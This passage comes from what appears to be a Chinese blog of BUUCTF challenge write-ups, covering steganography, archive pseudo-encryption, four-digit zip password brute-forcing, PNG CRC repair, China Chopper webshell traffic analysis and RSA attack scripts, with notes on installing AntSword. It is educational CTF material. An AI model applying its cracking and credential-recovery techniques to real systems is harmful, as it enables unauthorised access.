src="https://blue-blue-blue-blue.github.io/img/c12.png" width ="60%"><h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>用routerpassview打开(打开时要关闭杀毒软件)，挨个查找Password和Username并当成flag尝试</p><img src="https://blue-blue-blue-blue.github.io/img/c13.png" width ="60%"><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>用杀毒软件扫描文件，发现有后门病毒，打开相对应的文件，里面即有flag</p><h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>用Audacity打开，摩斯密码解密</p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>分离出zip,发现flag.vmdk是加密的，没有密码的相关提示爆破不了，应该是伪加密。把09改为00后，在kali执行7z x flag.vmdk -o.&#x2F;,分别brainfuck和Ook!解码即可</p><img src="https://blue-blue-blue-blue.github.io/img/c13.png" width ="60%"><h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p>“binwalk -e 文件名”分离出zip文件，里面有加密的图片和另一个zip。将最开始的zip用010打卡，取消图片的伪加密（在010最下方点asd&#x2F;good……的部分，会自动定位，将定位部分除开开端的4个字节后的第5个字节改为00即可），在linux运行“steghide info 文件名”发现有隐写，执行“steghide extract -sf 1.jpg”，输入空密码（直接按回车），得到”ko.txt”文件，执行“ls””cat ko.txt”，用里面的内容打开另一个zip即可</p><img src="https://blue-blue-blue-blue.github.io/img/c16.png" width ="60%"><h1 id="第二页"><a href="#第二页" class="headerlink" title="第二页"></a>第二页</h1><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p>在wireshark打开，找到一个http的包，追踪一下，发现有“name&#x3D;admina&amp;word&#x3D;adminb”，adminaadminb的md5值即是flag</p><img src="https://blue-blue-blue-blue.github.io/img/c15.png" width ="60%"><h2 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h2><p>F5隐写，切入F5-steganography目录后执行<code>java Extract 文件地址</code>,得到output.txt,打开是乱码，用010打开发现应该是.zip加伪加密，修改后缀去掉伪加密即可</p><img src="https://blue-blue-blue-blue.github.io/img/c17.png" width ="60%"><h2 id="认真你就输了"><a href="#认真你就输了" class="headerlink" title="认真你就输了"></a>认真你就输了</h2><p>binwalk即可</p><h2 id="藏藏藏"><a href="#藏藏藏" class="headerlink" title="藏藏藏"></a>藏藏藏</h2><p>binwalk,扫二维码</p><h2 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h2><p>foremost一下。以为是伪加密，binwalk后但是仍然需要密码，四位数字爆破压缩包密码，成功了（啧）</p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>binwalk+foremost得到一个压缩包，从第一个文件得到密码anaconda。snake,蛇，另一个翻译是serpent。将第二个文件转base64码，再Serpent解密</p><img src="https://blue-blue-blue-blue.github.io/img/c18.png" width ="60%"><h2 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h2><p>去掉伪加密后，与佛论禅解密</p><h2 id="你猜我是个啥"><a href="#你猜我是个啥" class="headerlink" title="你猜我是个啥"></a>你猜我是个啥</h2><p>010打开，末尾就是</p><h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><p>筛选post流，查看一个length格外长的包，发现有FF8FFE……即16进制的图片，在线16进制转base64转图片，得到图片上的密码。在Linux运行<code>foremost 666666.pcapng</code>,用改密码解开分离出的压缩包</p><img src="https://blue-blue-blue-blue.github.io/img/c19.png" width ="60%"><h2 id="秘密文件"><a href="#秘密文件" class="headerlink" title="秘密文件"></a>秘密文件</h2><p>foremost一下，4位数密码爆破</p><h2 id="just-a-rar"><a href="#just-a-rar" class="headerlink" title="just_a_rar"></a>just_a_rar</h2><p>4位数密码爆破，得到的图片文件查看属性-备注</p><h2 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h2><p>两个.gif，其中一个缺少文件头打不开，在010添加上再打开即可</p><h2 id="一叶障目"><a href="#一叶障目" class="headerlink" title="一叶障目"></a>一叶障目</h2><p>爆破宽高，<code>python .\png.py -f .\1.png</code>（1.png为图片名，png.py为程序名，要放在同一目录下）爆破出后在010修改宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;1.png&quot;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin_data = <span class="built_in">open</span>(args.f, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">crc32key = zlib.crc32(bin_data[<span class="number">12</span>:<span class="number">29</span>]) <span class="comment"># 计算crc</span></span><br><span class="line">original_crc32 = <span class="built_in">int</span>(bin_data[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(), <span class="number">16</span>) <span class="comment"># 原始crc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> crc32key == original_crc32: <span class="comment"># 计算crc对比原始crc</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;宽高没有问题!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    input_ = <span class="built_in">input</span>(<span class="string">&quot;宽高被改了, 是否CRC爆破宽高? (Y/n):&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> input_ <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;&quot;</span>]:</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">for</span> i, j <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">4095</span>), <span class="built_in">range</span>(<span class="number">4095</span>)): <span class="comment"># 理论上0x FF FF FF FF，但考虑到屏幕实际/cpu，0x 0F FF就差不多了，也就是4095宽度和高度</span></span><br><span class="line">            data = bin_data[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j) + bin_data[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">            crc32 = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span>(crc32 == original_crc32): <span class="comment"># 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nCRC32: <span class="subst">&#123;<span class="built_in">hex</span>(original_crc32)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;宽度: <span class="subst">&#123;i&#125;</span>, hex: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;高度: <span class="subst">&#123;j&#125;</span>, hex: <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="神奇的二维码"><a href="#神奇的二维码" class="headerlink" title="神奇的二维码"></a>神奇的二维码</h2><p>扫出来后没什么东西，binwalk一下，分离出一个文件夹，里面有一个加密音频，加密图片，一个txt文档，一个.doc文档。txt文档base64解码后得到图片的密码，结果图片啥都没有。doc文档多次base64解码后得到音频密码，音频再摩斯密码解密即可（<strong>得到的明文要小写</strong>）</p><h2 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h2><p>010打开，010后面有东西，将之16进制转ascii得到一串坐标，将之进行绘制：</p><p>执行脚本将坐标替换成gnuplot可以识别的格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> res:  <span class="comment"># 坐标格式文件比如(7,7),result.txt是转换前的坐标</span></span><br><span class="line">    re = res.read()</span><br><span class="line">    res.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1111.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> gnup:   <span class="comment"># 将转换后的坐标写入1111.txt</span></span><br><span class="line">    re = re.split()</span><br><span class="line">    tem = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(re)):</span><br><span class="line">        tem = re[i]</span><br><span class="line">        tem = tem.lstrip(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        tem = tem.rstrip(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tem)):</span><br><span class="line">            <span class="keyword">if</span> tem[j] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">                tem = tem[:j] + <span class="string">&#x27; &#x27;</span> + tem[j+<span class="number">1</span>:]</span><br><span class="line">        gnup.write(tem + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    gnup.close()</span><br></pre></td></tr></table></figure><p>进入转换后的文件所在的目录，执行<code>gnuplot</code>       <code>plot &quot;文件名&quot;</code> ,将绘制出的二维码扫出即可</p><img src="https://blue-blue-blue-blue.github.io/img/c19.png" width ="60%">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>problems-of-software</title>
      <link href="/2022/10/01/problems-of-software/"/>
      <url>/2022/10/01/problems-of-software/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载软件后，弹出下面样式的窗口不要急着关闭，让它跑一会</p><img src="https://blue-blue-blue-blue.github.io/img/d2.png" width ="60%"></blockquote><blockquote><p>Q:安装gmpy2时，显示</p><img src="https://blue-blue-blue-blue.github.io/img/d1.jpg" width ="60%"><p>A:python版本有3.x和2.x,将pip换成pip3再进行下载就不会有黄色字样的提醒；</p><p>更新了一下wheel,发现还是有相同的红色字样的报错（is not a supported wheel on this platform），其实是版本下载错了。运行<strong>pip debug –verbose</strong>，查看支持的版本，换成win_amd64的版本就行了</p></blockquote><blockquote><p>Q:下载nodejs后，输入命令npm -v没有回显，直接进入下一行</p><p>A:在C盘(这里一定是C盘，假如你把nodejs下到D盘，那也是找C盘) &#x3D;&gt; 用户（Users）&#x3D;&gt; Administrator（比如我的Administrator就是v587）&#x3D;&gt;删除.npmrc文件就可以了。（注意是.npmrc不是npmrc）</p></blockquote><blockquote><p>Q:蚁剑初始化显示解压失败</p><p>A：权限不够，用管理员模式打开软件，再进行初始化，初始化的时候选择空白文件。</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CRYPTO-BUUCTF</title>
      <link href="/2022/09/27/CRYPTO-BUUCTF/"/>
      <url>/2022/09/27/CRYPTO-BUUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="第一页"><a href="#第一页" class="headerlink" title="第一页"></a>第一页</h1><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>md5解码即得flag</p><img src="https://blue-blue-blue-blue.github.io/img/b1.png" width ="60%"><h2 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h2><p>base64解码</p><img src="https://blue-blue-blue-blue.github.io/img/b2.png" width ="60%"> <h2 id="Url编码"><a href="#Url编码" class="headerlink" title="Url编码"></a>Url编码</h2><p>url解码</p><img src="https://blue-blue-blue-blue.github.io/img/b3.png" width ="60%"> <h2 id="看我回旋踢1"><a href="#看我回旋踢1" class="headerlink" title="看我回旋踢1"></a>看我回旋踢1</h2><p>凯撒解码</p><img src="https://blue-blue-blue-blue.github.io/img/b4.png" width ="60%"> <h2 id="摩丝"><a href="#摩丝" class="headerlink" title="摩丝"></a>摩丝</h2><p>摩斯电码组成</p><img src="https://blue-blue-blue-blue.github.io/img/b5.png" width ="60%"> <h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>除了姓名和出生日期什么都没有，提示key里的×有10个，姓名缩写和出生日的字符加起来刚好十个，答案为flag{zs19900315}</p><img src="https://blue-blue-blue-blue.github.io/img/b6.png" width ="60%">  <h2 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h2><p>凯撒离不开偏移量,afZ_对应flag,按照ASCII表,ASCII值的差分别为5,6,7,8,将密文字符的偏移量依次加1即可(不能用解码程序,只能按ASCII表依次对照)</p><img src="https://blue-blue-blue-blue.github.io/img/b7.png" width ="60%"> <img src="https://blue-blue-blue-blue.github.io/img/ASCII.jpg" width ="60%">  <h2 id="Quoted-printable1"><a href="#Quoted-printable1" class="headerlink" title="Quoted-printable1"></a>Quoted-printable1</h2><p>Quoted-printable解码后用flag{}包裹</p><img src="https://blue-blue-blue-blue.github.io/img/b8.png" width ="60%">  <h2 id="Rabbit1"><a href="#Rabbit1" class="headerlink" title="Rabbit1"></a>Rabbit1</h2><p>Rabbit解密</p><img src="https://blue-blue-blue-blue.github.io/img/b9.png" width ="60%">  <h2 id="篱笆墙的影子1"><a href="#篱笆墙的影子1" class="headerlink" title="篱笆墙的影子1"></a>篱笆墙的影子1</h2><p>栅栏密码解密</p><img src="https://blue-blue-blue-blue.github.io/img/b10.png" width ="60%">  <h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><p>用RSA-Tool 2 by tE!程序进行解码，number Base调为10，e的数据要转为16进制再输入，输入p、q(或输入r、d，点击Factor N)，点击Calc.D，所得的D就是明文</p><img src="https://blue-blue-blue-blue.github.io/img/b11.png" width ="60%"><h2 id="消失的MD5-1"><a href="#消失的MD5-1" class="headerlink" title="消失的MD5   1"></a>消失的MD5   1</h2><p>最后一行加个括号，运行一下python脚本即可（终端运行python，输入python2  加一个空格  加文件地址（或者直接将文件拖入到终端界面））</p><img src="https://blue-blue-blue-blue.github.io/img/b12.jpg" width ="60%"><h2 id="Alice与Bob-1"><a href="#Alice与Bob-1" class="headerlink" title="Alice与Bob 1"></a>Alice与Bob 1</h2><p>用RSA-Tool 2 by tE分解素数，合成后MD5加密</p><img src="https://blue-blue-blue-blue.github.io/img/b13.png" width ="60%"><h2 id="大帝的秘密武器"><a href="#大帝的秘密武器" class="headerlink" title="大帝的秘密武器"></a>大帝的秘密武器</h2><p>将附件加上后缀.zip,由题目得此题与凯撒密码相关，将题目中的FRPHEVGL进行凯撒解码后，发现当偏移量为13的时候得到的明文为单词SECURITY，将密文以偏移量为13进行解码即可 </p><h2 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h2><p>用RSA-Tool 2 by tE!程序进行解密,运行pow（c,d,n）即所得明文。（复制的时候记得要复制完整，RSA-Tool 2 by tE!只显示当前三行但可能不止三行，用鼠标往下翻一翻，确保复制完整）</p><img src="https://blue-blue-blue-blue.github.io/img/b14.jpg" width ="60%"><h2 id="windows系统密码"><a href="#windows系统密码" class="headerlink" title="windows系统密码"></a>windows系统密码</h2><p>将ctf后的字符串ntlm解码一下</p><img src="https://blue-blue-blue-blue.github.io/img/b15.png" width ="60%"><h2 id="信息化时代的步伐"><a href="#信息化时代的步伐" class="headerlink" title="信息化时代的步伐"></a>信息化时代的步伐</h2><p>中文电码解码</p><img src="https://blue-blue-blue-blue.github.io/img/b17.png" width ="60%"><h2 id="凯撒？替换？呵呵-1"><a href="#凯撒？替换？呵呵-1" class="headerlink" title="凯撒？替换？呵呵!  1"></a>凯撒？替换？呵呵!  1</h2><p>强行爆破，用MTHJ&#x3D;flag条件得到替换出来的结果，最后删去空格即可</p><img src="https://blue-blue-blue-blue.github.io/img/b18.png" width ="60%"><h2 id="萌萌哒的八戒"><a href="#萌萌哒的八戒" class="headerlink" title="萌萌哒的八戒"></a>萌萌哒的八戒</h2><p>猪圈密码解码</p><img src="https://blue-blue-blue-blue.github.io/img/b19.png" width ="60%"><h2 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h2><p>一甲子是60年，对照60年甲子表，将其甲子表数值当成ASCII值，得到XZSDMFLZ，栅栏解密后凯撒解密，猜测SHUANGYU为答案</p><img src="https://blue-blue-blue-blue.github.io/img/b20.png" width ="60%"><h2 id="RSA1-1"><a href="#RSA1-1" class="headerlink" title="RSA1"></a>RSA1</h2><p>m &#x3D; (((mp-mq)* gmpy2.invert(q,p))%p)*q+mq得到字符串0x6e6f784354467b57333163306d335f37305f4368316e343730776e7d，以0x开头，为16进制，16进制转文本解码可得</p><img src="https://blue-blue-blue-blue.github.io/img/b21.png" width ="60%"><h2 id="权限获得第一步"><a href="#权限获得第一步" class="headerlink" title="权限获得第一步"></a>权限获得第一步</h2><p>猜测与NTLM相关，将最末尾的字符串NTML解密即可</p><img src="https://blue-blue-blue-blue.github.io/img/b22.png" width ="60%"><h2 id="old-fashion"><a href="#old-fashion" class="headerlink" title="old-fashion"></a>old-fashion</h2><p>观察文本，感觉最后一句像含有部分的flag,猜测将文本进行简单的处理会有所收获。用quipqiup进行爆破即可（将全部文本内容拿去爆，不要只拿最后一句）</p><img src="https://blue-blue-blue-blue.github.io/img/b23.png" width ="60%"><h2 id="世上无难事"><a href="#世上无难事" class="headerlink" title="世上无难事"></a>世上无难事</h2><p>用quipqiup进行爆破，再将大写字母转换成小写即可</p><img src="https://blue-blue-blue-blue.github.io/img/b24.png" width ="60%"><h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><p>解RSA后得到13040004482819947212936436796507286940525898188874967465457845309271472287032383337801279101，为十进制，将其转为十六进制后再16进制转文本即可（RSA解码后的数太大，在线的网站无法转换进制，于是借助了BigNum1.0软件）</p><img src="https://blue-blue-blue-blue.github.io/img/b25.png" width ="60%"><h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><p>运行脚本后，十进制转十六转文</p><h2 id="Unencode-1"><a href="#Unencode-1" class="headerlink" title="Unencode 1"></a>Unencode 1</h2><p>UUencode解码</p><img src="https://blue-blue-blue-blue.github.io/img/b26.png" width ="60%"><h2 id="Morse-1"><a href="#Morse-1" class="headerlink" title="Morse 1"></a>Morse 1</h2><p>摩斯电码解码后十六进制转文</p><h2 id="还原大师-1"><a href="#还原大师-1" class="headerlink" title="还原大师 1"></a>还原大师 1</h2><p>MD5爆破，运行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment">#print hashlib.md5(s).hexdigest().upper()</span></span><br><span class="line">k = <span class="string">&#x27;TASC?O3RJMV?WDJKX?ZM&#x27;</span>                    <span class="comment">#要还原的明文</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">temp1 = k.replace(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">chr</span>(<span class="number">65</span>+i)),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">temp2 = temp1.replace(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">chr</span>(<span class="number">65</span>+j),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">temp3 = temp2.replace(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">chr</span>(<span class="number">65</span>+n),<span class="number">1</span>)</span><br><span class="line">s = hashlib.md5(temp3.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest().upper()<span class="comment">#注意大小写</span></span><br><span class="line"><span class="keyword">if</span> s[:<span class="number">4</span>] == <span class="string">&#x27;E903&#x27;</span>:    <span class="comment">#检查元素</span></span><br><span class="line"><span class="built_in">print</span> (s)       <span class="comment">#输出密文</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="异性相吸-1"><a href="#异性相吸-1" class="headerlink" title="异性相吸 1"></a>异性相吸 1</h2><p>密文用010打开，点击hex,将获得的十六进制数转为二进制数；key将ASCII码转二进制；发现两段二进制码位数不一样，将短的首端<strong>加0补齐</strong>；后将其进行异或操作，再二进制转十六进制转文</p><img src="https://blue-blue-blue-blue.github.io/img/b27.png" width ="60%"><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>将pub.key的文件用记事本打开，将其所有内容（<strong>包括首行—–BEGIN PUBLIC KEY—–和末行</strong>）进行公钥解析，得到e,n。将n进行分解得到p,q（复制时点击p、q后，复制顶部Factorize那一栏即可）。将另一个文件后缀改为txt。下载rsa库后（运行pip3 install rsa）</p><p>运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">n= <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p= <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q= <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">d= <span class="number">81176168860169991027846870170527607562179635470395365333547868786951080991441</span></span><br><span class="line"></span><br><span class="line">key = rsa.PrivateKey(n,e,d,q,p)         <span class="comment">#在pkcs标准中,pkcs#1规定,私钥包含(n,e,d,p,q)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\v587\Desktop\\flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:  <span class="comment">#以二进制读模式，读取密文</span></span><br><span class="line">    f = f.read()</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(f,key))           <span class="comment"># f:公钥加密结果  key:私钥</span></span><br></pre></td></tr></table></figure><img src="https://blue-blue-blue-blue.github.io/img/b28.png" width ="60%"><h2 id="RSAROLL-1"><a href="#RSAROLL-1" class="headerlink" title="RSAROLL 1"></a>RSAROLL 1</h2><p>data文件里第一行的数据{920139713,19}代表n为920139713，e为19，分解得p、q为18443,49891。复制除第一行的数据为新文件，每行数据进行解密：</p><p>运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N,p,q,e=<span class="number">920139713</span>,<span class="number">18443</span>,<span class="number">49891</span>,<span class="number">19</span></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">result=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\v587\Desktop\\新建 文本文档.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line=line.strip(<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#去掉列表中每一个元素的换行符</span></span><br><span class="line">        result.append(<span class="built_in">chr</span>(<span class="built_in">pow</span>(<span class="built_in">int</span>(line),d,N)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="第二页"><a href="#第二页" class="headerlink" title="第二页"></a>第二页</h1><h2 id="Dangerous-RSA-1"><a href="#Dangerous-RSA-1" class="headerlink" title="Dangerous RSA  1"></a>Dangerous RSA  1</h2><p>低加密指数攻击，运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res=iroot(c+k*n,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>]==<span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k=k+<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="basic-rsa1"><a href="#basic-rsa1" class="headerlink" title="basic rsa1"></a>basic rsa1</h2><p>题目最下行的注释即为c</p><img src="https://blue-blue-blue-blue.github.io/img/b29.png" width ="60%"><p>运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 